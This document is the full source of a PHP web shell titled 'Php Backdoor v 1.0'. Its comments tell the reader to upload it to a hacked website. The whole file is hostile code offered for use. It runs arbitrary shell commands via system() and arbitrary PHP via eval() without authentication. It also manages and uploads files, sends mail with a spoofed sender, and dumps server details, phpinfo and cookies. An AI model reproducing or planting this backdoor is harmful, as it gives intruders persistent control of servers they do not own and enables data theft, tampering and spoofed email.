<?

// ################################
// Php Backdoor v 1.0 by ^Jerem
// ################################
// ################################
// This backdoor coded in php allows
// allows to control a web serv ...
// For use this script upload this
// on the ftp server of the hacked
// web site. Enjoy ^^
// ################################
// ################################
// Author: ^Jerem
// Mail: jerem@x-perience.org
// Web: http://www.x-perience.org
// ################################


echo '<html>';
echo '<head><title>Php Backdoor v 1.0 by ^Jerem</title></head>';
echo '<link rel="stylesheet" href="http://membres.lycos.fr/webchat/style.css" type="text/css">';
echo '<body bgcolor=black>';
echo '<font face="courier" size="2" color="#FFFFFF">';

echo '<h1>Php Backdoor v 1.0 by ^Jerem</h1><br><br>';
echo '<center><img src="http://img418.imageshack.us/img418/3218/jerem9sn.png" alt="Owned by ^Jerem"></center>';
echo '<br><br>';
echo 'Backdoor option list:<br><br>';
echo '• <a href="?action=index">Backdoor index</a><br><br>';
echo '• <a href="?action=shell">Execute a shell code</a><br>';
echo '• <a href="?action=php">Execute a php code</a><br>';
echo '• <a href="?action=files">Files Management</a><br>';
echo '• <a href="?action=up">Upload a file</a><br>';
echo '• <a href="?action=listing">Files listing</a><br>';
echo '• <a href="?action=mail">Send a Email</a><br>';
echo '• <a href="?action=infos">Infos serv</a>';



if ($action == "shell") {
echo '<br><br>#########################<br><br>';
echo 'Enter shell code to execute: ';
echo '<form method="POST" action="?action=shellgo">';
//echo '<input type="text" name="cmd" size="50" value="ls -a">  ';
echo '<textarea name="cmd" cols="50" rows="10"></textarea><br>';
echo '<input type="submit" value="Execute"></form>';
} elseif ($action == "shellgo") {
echo '<br><br>#########################<br><br>';
$cmd = stripslashes($cmd);
echo 'The shell code <b>'.$cmd.'</b> as been executed on server.<br>';
echo 'The server with answered this your request:<br><br>';
system($cmd);
} else if ($action == "mail") {
echo '<br><br>#########################<br><br>';
echo '<form method="POST" action="?action=mailgo">';
echo 'Enter the expeditor Email: ';
echo '<input type="text" name="exp" size="30" value="you@ownz.com"><br>';
echo 'Enter the receptor Email: ';
echo '<input type="text" name="recpt" size="30" value="fucker@small-dick.com"><br>';
echo 'Enter the topic of your Email: ';
echo '<input type="text" name="topic" size="30" value="Have a nice day looser :D"><br><br>';
echo 'Enter the Email content:<br>';
echo '<textarea name="content" cols="50" rows="10"></textarea><br><br>';
echo '<input type="submit" value="Send Email"></form>';
} else if ($action == "mailgo") {
echo '<br><br>#########################<br><br>';
echo 'Your Email have been sended to <b>'.$recpt.'</b>.<br>';
$hd = 'From:'.$exp.' \r\nReply-To:'.$exp.'';
mail($recpt,$topic,$content,$hd);
} else if ($action == "up") {
echo '<br><br>#########################<br><br>';
echo '<form method="POST" enctype="multipart/form-data" action="?action=upgo">';
echo 'Select a file to upload: ';
echo '<input type="file" name="file" size="30"><br>  ';
echo 'Enter the name of file in the server: ';
echo '<input type="text" name="fts" size="30" value="your-file.txt">  ';
echo '<input type="submit" value="Upload this file"></form>';
} else if ($action == "upgo") {
echo '<br><br>#########################<br><br>';
copy($file, $fts);
echo 'Your file was succelify uploaded on server.';
} else if ($action == "listing") {
echo '<br><br>#########################<br><br>';
echo 'Files listing of <b>/</b><br><br>';
} else if ($action == "infos") {
echo '<br><br>#########################<br><br>';
echo 'Server informations<br><br>';
echo 'Backdoor file:<b> '.$SCRIPT_NAME.'</b><br>';
echo 'Backdoor URL:<b> '.$SCRIPT_FILENAME.'</b><br>';
echo 'OS & PhpVersion:<b> '.$SERVER_SOFTWARE.'</b><br>';
echo 'Admin Email:<b> '.$SERVER_ADMIN.'</b><br>';
echo 'Server name:<b> '.$SERVER_NAME.'</b><br>';
echo 'Server cookie:<b> <script>document.write(document.cookie)</script></b><br>';
echo 'Server ip:<b> '.$SERVER_ADDR.'</b> (Running on port<b> '.$SERVER_PORT.'</b>)<br>';
echo 'CGI Version:<b> '.$GATEWAY_INTERFACE.'</b><br>';
echo 'Request Method:<b> '.$REQUEST_METHOD.'</b><br>';
echo 'HTTP Protocol Version:<b> '.$SERVER_PROTOCOL.'</b><br>';
echo 'HTTP Heading Accept:<b> '.$HTTP_ACCEPT.'</b><br>';
echo 'HTTP User Agent:<b> '.$HTTP_USER_AGENT.'</b><br>';
echo 'HTTP Accept Charset:<b> '.$HTTP_ACCEPT_CHARSET.'</b><br>';
echo 'HTTP Accept Encodingt:<b> '.$HTTP_ACCEPT_ENCODING.'</b><br>'; 
echo 'HTTP Accept Language:<b> '.$HTTP_ACCEPT_LANGUAGE.'</b><br>';
echo 'HTTP Heading Connection Protocol:<b> '.$HTTP_CONNECTION.'</b><br>';
echo 'HTTP Heading Host Protocol:<b> '.$HTTP_HOST.'</b>';
echo '<br><br>#########################<br><br>';
echo 'Phpinfo();<br><br>';
echo '<iframe src="?action=phpinfo"  height="400" width="800"></iframe>';
} else if ($action == "phpinfo") {
phpinfo();
} else if ($action == "php") {
echo '<br><br>#########################<br><br>';
echo 'Enter php code to execute:<br><br>';
echo '<form method="POST" action="?action=phpgo">';
echo '<textarea name="cmd" cols="50" rows="10"></textarea><br>';
echo '<input type="submit" value="Execute"></form>';
} else if ($action == "phpgo") {
echo '<br><br>#########################<br><br>';
$cmd = stripslashes($cmd);
echo 'The php code <b>'.$cmd.'</b> as been executed.<br>';
echo 'The server with answered this your request:<br><br>';
eval($cmd);
} else if ($action == "files") {
echo '<br><br>#########################<br><br>';
echo 'Create a new file:<br><br>';
echo '<form method="POST" action="?action=filenew">';
echo 'File name: <input type="text" name="nfile" size="30" value="you-file.txt">  ';
echo '<input type="submit" value="Create"></form>';
echo '<br><br>#########################<br><br>';
echo 'Delete a file:<br><br>';
echo '<form method="POST" action="?action=filedel">';
echo 'File name: <input type="text" name="nfile" size="30" value="you-file.txt">  ';
echo '<input type="submit" value="Delete"></form>';
echo '<br><br>#########################<br><br>';
echo 'Modify a file:<br><br>';
echo '<form method="POST" action="?action=filemod">';
echo 'File name: <input type="text" name="nfile" size="30" value="you-file.txt">  ';
echo '<input type="submit" value="Modify"></form>';
echo '<br><br>#########################<br><br>';
echo 'Read a file:<br><br>';
echo '<form method="POST" action="?action=fileread">';
echo 'File name: <input type="text" name="nfile" size="30" value="you-file.txt">  ';
echo '<input type="submit" value="Read"></form>';
echo '<br><br>#########################<br><br>';
echo 'Rename a file:<br><br>';
echo '<form method="POST" action="?action=filename">';
echo 'File name: <input type="text" name="nfile" size="30" value="you-file.txt"><br>  ';
echo 'New name: <input type="text" name="newfile" size="30" value="you-new-file.txt">  ';
echo '<input type="submit" value="Rename"></form>';
} else if ($action == "filenew") {
echo '<br><br>#########################<br><br>';
echo 'Your file <b> '.$nfile.' </b> was created susellify<br><br>';
$index=fopen($nfile,'a');
fwrite($index,'');
fclose($index);
} else if ($action == "filedel") {
echo '<br><br>#########################<br><br>';
echo 'Your file <b> '.$nfile.' </b> was deleted susellify<br><br>';
unlink($nfile);
} else if ($action == "filemod") {
echo '<br><br>#########################<br><br>';
echo 'Modifing <b> '.$nfile.' </b>:<br><br>';
echo '<form method="POST" action="?action=filemodgo&nfile='.$nfile.'">';
$index = fopen($nfile, "r");
$ct = fread($index, filesize($nfile));
$ct = htmlentities ($ct, ENT_QUOTES);
$ct = nl2br($ct);
echo '<textarea name="newctt" cols="50" rows="10">'.$ct.'</textarea><br>';
echo '<input type="submit" value="Save modification"></form>';
} else if ($action == "filemodgo") {
echo '<br><br>#########################<br><br>';
echo 'You files <b> '.$nfile.' </b> as modified sucellify<br><br>';
$index = fopen($nfile, "w");
fwrite($index, stripslashes($newctt));
} else if ($action == "fileread") {
echo '<br><br>#########################<br><br>';
echo 'Reading <b> '.$nfile.' </b> ...<br><br>';
$index = fopen($nfile, "r");
$ct = fread($index, filesize($nfile));
$ct = htmlentities ($ct, ENT_QUOTES);
$ct = nl2br($ct);
echo $ct;
} else if ($action == "filename") {
copy($nfile, $newfile);
unlink($nfile);
}
else {
echo '<br><br>################################<br><br>';
echo 'Php Backdoor v 1.0 by ^Jerem<br><br>';
echo '################################<br><br>';
echo 'This backdoor coded in php allows<br>';
echo 'allows to control a web serv ...<br>';
echo 'For use this script upload this<br>';
echo 'on the ftp server of the hacked<br>';
echo 'web site. Enjoy ^^<br><br>';
echo '################################<br><br>';
echo 'Author: ^Jerem<br>';
echo 'Mail: jerem@x-perience.org<br>';
echo 'Web: http://www.x-perience.org<br>';
}


echo '</font></body>';
echo '</html>';

?> 